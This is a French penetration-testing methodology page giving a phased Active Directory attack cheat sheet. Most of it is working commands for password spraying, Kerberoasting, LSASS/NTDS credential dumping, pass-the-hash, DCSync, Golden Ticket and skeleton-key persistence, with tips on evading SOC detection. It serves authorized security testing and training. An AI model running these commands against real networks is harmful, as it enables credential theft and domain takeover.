# Active Directory Méthodologie

La méthodologie d'attaque Active Directory suit une progression logique depuis la reconnaissance initiale jusqu'à la compromission complète du domaine. Cette page sert de guide de référence pour structurer un engagement AD de manière cohérente et exhaustive.

## Qu'est-ce qu'Active Directory ?

Active Directory (AD) est le service d'annuaire de Microsoft utilisé dans la quasi-totalité des environnements Windows d'entreprise. Il centralise la gestion des utilisateurs, ordinateurs, groupes, politiques et authentifications du domaine. Sa compromission représente généralement l'objectif final d'un pentest en environnement Windows.

### Composants clés

| Composant | Description |
|---|---|
| Domain Controller (DC) | Serveur central gérant l'authentification AD |
| Domain | Périmètre logique regroupant les objets AD |
| Forest | Ensemble de domaines partageant un schéma commun |
| Trust | Relation de confiance entre domaines |
| GPO | Politique de groupe appliquée aux objets AD |
| OU | Unité organisationnelle conteneur d'objets |
| SPN | Service Principal Name identifiant de service Kerberos |
| ACL / DACL | Listes de contrôle d'accès sur les objets AD |

### Protocoles impliqués

| Protocole | Port | Usage |
|---|---|---|
| Kerberos | 88 | Authentification principale |
| LDAP | 389 / 636 | Annuaire et énumération |
| SMB | 445 | Partages et exécution distante |
| RPC | 135 | Administration distante |
| DNS | 53 | Résolution de noms |
| WinRM | 5985 / 5986 | Administration PowerShell distante |
| RDP | 3389 | Bureau à distance |

## Vue d'ensemble — Kill Chain AD
```
 Reconnaissance
       │
       ▼
 Accès Initial
       │
       ▼
 Enumération du domaine
       │
       ▼
 Credential Access
       │
       ▼
 Mouvement Latéral
       │
       ▼
 Privilege Escalation
       │
       ▼
 Domain Admin
       │
       ▼
 Persistance & Post-exploitation
```

## Phase 1 — Reconnaissance

Collecte d'informations sur l'environnement AD avant tout accès.

### Reconnaissance externe

::: code-group
```bash[dig]
# Identifier les serveurs MX / SPF / DMARC
dig MX domain.com
dig TXT domain.com | grep spf
```
```bash[nmap]
# Identifier les serveurs AD exposés
nmap -p88,389,445,3389 <target_range>
```
```bash[amass] 
# Sous-domaines
amass enum -d domain.com
```
```bash[amass] 
# Sous-domaines
subfinder -d domain.com
```
```bash[OSINT]
# OSINT utilisateurs
theHarvester -d domain.com -b linkedin,google
# Hunter.io, LinkedIn Sales Navigator
```
:::

### Identification du domaine
:::code-group
```bash[netexec]
# Via SMB
nxc smb <target>
nxc smb <target> -u '' -p ''
```
```bash[ldapsearch]
# Via LDAP
ldapsearch -x -H ldap://<DC> -s base namingcontexts
```
```bash[nslookup]
# Via DNS
nslookup -type=SRV _kerberos._tcp.domain.com
```
```bash[dig]
# Via DNS
dig SRV _ldap._tcp.dc._msdcs.domain.com
```
```bash[rpcclient]
# Via RPC
rpcclient -U "" -N <DC> -c "querydominfo"

```
:::

## Phase 2 — Accès Initial

Obtenir un premier pied dans le domaine même avec un compte utilisateur basique.

### Vecteurs d'accès initial courants
```bash
# Null session
nxc smb <DC> -u '' -p ''
rpcclient -U "" -N <DC>  
```

```bash
# Credentials par défaut
nxc smb <DC> -u Administrator -p Password123!
nxc smb <DC> -u Administrator -p ''
```

```bash
# Password spraying sans compte
kerbrute passwordspray -d domain.com --dc <DC> users.txt Password123!
nxc smb <DC> -u users.txt -p Password123! --continue-on-success
```  

```bash
# AS-REP Roasting  sans compte
impacket-GetNPUsers domain.com/ -usersfile users.txt -no-pass -dc-ip <DC>
```

### Valider l'accès obtenu
Lorsque vous obtenez des identifients il est toujours essentiel de confirmer leur validité.
```bash
# Tester les credentials
nxc smb <DC> -u user -p password
nxc ldap <DC> -u user -p password
nxc winrm <target> -u user -p password
```  
Si les identifiants sont valide et l'utilisateur les autorisations d'access à distance vous pouvez obtenir un shell sur le système.
:::code-group
```bash[Evil-winrm]
# Obtenir un shell
evil-winrm -i <target> -u user -p password
```
```bash[Impacket-psexec]
# Obtenir un shell
impacket-psexec domain.com/user:password@<target>
```
::: 

## Phase 3 — Enumération du Domaine

Cartographier l'environnement AD après obtention d'un compte utilisateur.

### Enumération basique
:::code-group
```bash[Netexec]
# Info domaine
nxc smb <DC> -u user -p password --pass-pol
nxc smb <DC> -u user -p password --users
nxc smb <DC> -u user -p password --groups
nxc smb <DC> -u user -p password --computers
nxc smb <DC> -u user -p password --shares
``` 
```bash[ldapsearch]
# Via LDAP
ldapsearch -x -H ldap://<DC> -D "user@domain.com" -w password \
  -b "dc=domain,dc=com" "(objectClass=user)" sAMAccountName memberOf
```
```bash[rpcclient]
# Enumeration des utilisateurs via RPC
rpcclient -U "user%password" <DC> -c "enumdomusers"
# enumeration des groupes
rpcclient -U "user%password" <DC> -c "enumdomgroups"
```
:::

### BloodHound — Cartographie complète
```bash
# Ingestor Python
bloodhound-python -u user -p password -d domain.com -dc <DC> -c all -o /tmp/bh

# Via NetExec
nxc ldap <DC> -u user -p password --bloodhound -c all --dns-server <DC>

# Requêtes Cypher prioritaires
# Chemins vers Domain Admins
MATCH p=shortestPath((u:User)-[*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.COM"})) RETURN p

# Comptes Kerberoastables avec chemin DA
MATCH (u:User {hasspn:true}),(g:Group {name:"DOMAIN ADMINS@DOMAIN.COM"}),
p=shortestPath((u)-[*1..]->(g)) RETURN p

# Comptes AS-REP Roastables
MATCH (u:User {dontreqpreauth:true}) RETURN u

# Délégations non contraintes
MATCH (c:Computer {unconstraineddelegation:true}) RETURN c

# Admins locaux
MATCH (u:User)-[:AdminTo]->(c:Computer) RETURN u,c
```

### Dump LDAP complet
```bash
ldapdomaindump <DC> -u 'domain\user' -p password -o /tmp/ldap_dump
```

## Phase 4 — Credential Access

Collecte de credentials pour élever les privilèges.

### Kerberoasting
```bash
# Identifier les SPNs
impacket-GetUserSPNs domain.com/user:password -dc-ip <DC>

# Dumper les hashes
impacket-GetUserSPNs domain.com/user:password -dc-ip <DC> \
  -request -outputfile kerberoast.txt

# Crack
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt
```

### AS-REP Roasting
```bash
# Sans compte
impacket-GetNPUsers domain.com/ -usersfile users.txt \
  -no-pass -dc-ip <DC> -outputfile asrep.txt

# Avec compte
impacket-GetNPUsers domain.com/user:password \
  -dc-ip <DC> -request -outputfile asrep.txt

# Crack
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
```

### Dump de credentials
:::code-group
```bash[NetExec]
# SAM admin local
nxc smb <target> -u user -p password --sam

# LSASS hashes en mémoire
nxc smb <target> -u user -p password -M lsassy

# LSA Secrets
nxc smb <target> -u user -p password --lsa

# NTDS contrôleur de domaine
nxc smb <DC> -u user -p password --ntds
```
```bash[Impacket-secretsdump]
# Via Impacket
impacket-secretsdump domain.com/user:password@<target>
impacket-secretsdump domain.com/user:password@<DC> -just-dc-ntlm
```
:::

### Password Spraying
```bash
# Identifier la politique de verrouillage AVANT
nxc smb <DC> -u user -p password --pass-pol

# Spraying
nxc smb <DC> -u users.txt -p Password123! --continue-on-success
kerbrute passwordspray -d domain.com --dc <DC> users.txt Password123!
```

## Phase 5 — Mouvement Latéral

Se déplacer vers d'autres machines avec les credentials obtenus.

### Avec credentials
```bash
# PSExec
impacket-psexec domain/user:password@<target>

# WMIExec
impacket-wmiexec domain/user:password@<target>

# SMBExec
impacket-smbexec domain/user:password@<target>

# Evil-WinRM
evil-winrm -i <target> -u user -p password

# NetExec
nxc smb <target> -u user -p password -x "whoami"
nxc winrm <target> -u user -p password -x "whoami"
```

### Avec hash NTLM — Pass-the-Hash
```bash
impacket-psexec domain/user@<target> -hashes :NTLMhash
impacket-wmiexec domain/user@<target> -hashes :NTLMhash
nxc smb <target> -u user -H NTLMhash
evil-winrm -i <target> -u user -H NTLMhash
```

### Avec ticket Kerberos — Pass-the-Ticket
```bash
export KRB5CCNAME=/path/to/ticket.ccache
impacket-psexec domain/user@<target> -k -no-pass
impacket-wmiexec domain/user@<target> -k -no-pass
```

### Cartographie des accès
```bash
# Machines accessibles avec le compte courant
nxc smb 192.168.1.0/24 -u user -p password
nxc smb 192.168.1.0/24 -u user -H NTLMhash

# Admin local sur quelles machines
nxc smb 192.168.1.0/24 -u user -p password --local-auth
```

## Phase 6 — Privilege Escalation

Escalader vers Domain Admin ou équivalent.

### Via ACL mal configurées
```bash
# Identifier les ACL abusables via BloodHound
# WriteDACL, GenericAll, GenericWrite, WriteOwner, ForceChangePassword

# Modifier le mot de passe d'un compte (WriteDACL / GenericAll)
impacket-changepasswd domain.com/targetuser -newpass Password123! \
  -authuser compromised_user -authpass password -dc-ip <DC>

# Ajouter un utilisateur à un groupe (GenericWrite)
net rpc group addmem "Domain Admins" compromised_user \
  -U domain/compromised_user%password -S <DC>
```

### Via DCSync (si droits Replication)
```bash
# DCSync — dumper tous les hashes
impacket-secretsdump domain.com/user:password@<DC> -just-dc-ntlm

# Via Mimikatz (Windows)
lsadump::dcsync /domain:domain.com /user:Administrator
lsadump::dcsync /domain:domain.com /all /csv
```

### Via délégation non contrainte
```bash
# Identifier les machines avec délégation non contrainte
nxc ldap <DC> -u user -p password --trusted-for-delegation

# Forcer une connexion DC → machine vulnérable (PrinterBug)
impacket-printerbug domain.com/user:password@<DC> <vulnerable_machine>

# Capturer le TGT sur la machine vulnérable (Rubeus)
Rubeus.exe monitor /interval:5 /nowrap

# Injecter et utiliser le ticket
Rubeus.exe ptt /ticket:<base64_ticket>
impacket-psexec domain.com/DC$@<DC> -k -no-pass
```

### Via Kerberoasting compte privilégié
```bash
# Si un compte DA ou admin est Kerberoastable
impacket-GetUserSPNs domain.com/user:password -dc-ip <DC> -request

# Crack prioritaire sur les comptes à hauts privilèges
hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt
```

## Phase 7 — Domain Admin

Actions post-compromission Domain Admin.

### Dump complet du domaine
```bash
# DCSync — tous les hashes
impacket-secretsdump domain.com/Administrator:password@<DC> -just-dc-ntlm

# Dump NTDS complet
nxc smb <DC> -u Administrator -p password --ntds

# Hash du compte krbtgt
impacket-secretsdump domain.com/Administrator:password@<DC> -just-dc-user krbtgt
```

### Accès à toutes les machines
```bash
# Avec le hash Administrator du domaine
nxc smb 192.168.1.0/24 -u Administrator -H DomainAdminHash
nxc smb 192.168.1.0/24 -u Administrator -H DomainAdminHash -x "whoami"

# Dump SAM sur toutes les machines
nxc smb 192.168.1.0/24 -u Administrator -H DomainAdminHash --sam
```

### Accès aux partages
```bash
# Lister tous les partages du domaine
nxc smb 192.168.1.0/24 -u Administrator -H DomainAdminHash --shares

# Chercher des fichiers sensibles
nxc smb 192.168.1.0/24 -u Administrator -H DomainAdminHash -M spider_plus
```

## Phase 8 — Persistance

Maintenir l'accès après la fin de l'engagement — à documenter sans déployer en production.

### Golden Ticket
```bash
# Récupérer le hash krbtgt et le SID du domaine
impacket-secretsdump domain.com/Administrator:password@<DC> -just-dc-user krbtgt
impacket-getPac domain.com/user:password -targetUser Administrator

# Créer le Golden Ticket
impacket-ticketer -nthash <KRBTGT_HASH> \
  -domain-sid <DOMAIN_SID> \
  -domain domain.com \
  Administrator

# Utiliser le Golden Ticket
export KRB5CCNAME=Administrator.ccache
impacket-psexec domain.com/Administrator@<DC> -k -no-pass
```

### Silver Ticket
```bash
# Silver Ticket pour un service spécifique
impacket-ticketer -nthash <SERVICE_HASH> \
  -domain-sid <DOMAIN_SID> \
  -domain domain.com \
  -spn cifs/<target> \
  user
```

### Skeleton Key
```bash
# Mimikatz — patch LSASS (non persistant — redémarrage = reset)
privilege::debug
misc::skeleton
# Mot de passe universel : mimikatz
```

### AdminSDHolder — Persistance ACL
```bash
# Donner FullControl sur AdminSDHolder à un compte backdoor
impacket-dacledit domain.com/DA_user:password@<DC> \
  -action write -rights FullControl \
  -target-dn "CN=AdminSDHolder,CN=System,DC=domain,DC=com" \
  -principal backdoor_user
```

## Checklist Globale

::: details Phase 1 — Reconnaissance

- Domaine identifié
- DC identifié (IP, hostname)
- Utilisateurs collectés via OSINT
- Services exposés identifiés
- Politique de verrouillage récupérée

:::

::: details Phase 2 — Accès Initial

- Null session testée
- AS-REP Roasting tenté sans credentials
- Password spraying effectué
- Credentials valides obtenus
- Accès validé

:::

::: details Phase 3 — Enumération

- BloodHound lancé et analysé
- Utilisateurs et groupes énumérés
- Chemins vers DA identifiés
- Comptes Kerberoastables identifiés
- Comptes AS-REP Roastables identifiés
- Délégations vérifiées
- ACL abusables identifiées
- Partages accessibles listés

:::

::: details Phase 4 — Credential Access

- Kerberoasting effectué
- AS-REP Roasting effectué
- Hashes crackés
- SAM / LSASS dumpés
- Password spraying effectué

:::

::: details Phase 5 — Mouvement Latéral

- Machines accessibles cartographiées
- Accès admin local identifiés
- Shell obtenu sur cibles prioritaires
- Nouveaux credentials collectés

:::

::: details Phase 6 — Privilege Escalation

- ACL abusables exploitées
- Délégations exploitées
- DCSync tenté
- Domain Admin obtenu

:::

::: details Phase 7 — Post-exploitation DA

-  NTDS dumpé
-  Tous les hashes collectés
-  Hash krbtgt récupéré
-  Accès à toutes les machines validé
-  Partages sensibles accédés

:::

::: details Phase 8 — Persistance

- Golden Ticket créé et testé
- Mécanismes de persistance documentés
- Artefacts nettoyés
- IOC documentés

:::

::: info Tips 

- Toujours lancer **BloodHound en premier** après obtention d'un compte visualiser avant d'attaquer
- Vérifier la **politique de verrouillage avant tout spraying** un seuil à 3 tentatives peut verrouiller tout le domaine
- Le **Kerberoasting** est souvent le chemin le plus rapide vers DA si un compte de service est membre d'un groupe privilégié
- Prioriser les attaques **silencieuses** (Kerberoasting, AS-REP) avant les attaques bruyantes (bruteforce, DCSync)
- **DCSync** génère des Event ID 4662 surveiller si un SOC est actif
- Un **Golden Ticket** reste valide même après reset du mot de passe administrateur seul le reset du compte krbtgt invalide les tickets existants
- Documenter **chaque étape avec timestamp** pour le rapport final

:::

## Ressources

- [HackTricks Active Directory Methodology](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology)
- [The Hacker Recipes AD](https://www.thehacker.recipes/ad/)
- [PayloadsAllTheThings AD Attack](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md)
- [BloodHound Documentation](https://bloodhound.readthedocs.io/)
- [adsecurity.org](https://adsecurity.org/)
- [MITRE ATT&CK Enterprise](https://attack.mitre.org/matrices/enterprise/)

## Notes
```
# Notes terrain
```

<div class="page-footer">

<span>![Last updated](https://img.shields.io/github/last-commit/Hackthus/The-Hackers-237?label=Last%20updated&style=flat-square&color=gray)</span>

<span>[![Edit this page on GitHub](https://img.shields.io/badge/✏️%20Edit%20this%20page-GitHub-black?style=flat-square&logo=github)](https://github.com/Hackthus/The-Hackers-237/edit/main/docs/ad/methodology.md)</span>

</div>